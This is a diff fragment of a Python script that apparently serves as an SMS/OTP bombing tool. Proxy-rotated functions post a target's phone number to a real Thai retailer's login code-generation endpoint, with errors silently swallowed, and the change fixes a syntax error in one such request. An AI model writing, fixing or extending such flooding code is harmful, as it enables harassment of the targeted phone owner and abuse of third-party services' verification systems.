@@ -919,7 +919,7 @@ def run():
                         except:pass
                     def highzy9():
                         try:
-                            httpx.post(f"https://shop.foodland.co.th/login/generation", data={"phone":f"{phone}",proxies={'http': 'http://' + random.choice(s)})
+                            httpx.post(f"https://shop.foodland.co.th/login/generation",data={"phone":f"{phone}"},proxies={'http': 'http://' + random.choice(s)})
                         except:pass
                     def highzy10():
                             try:
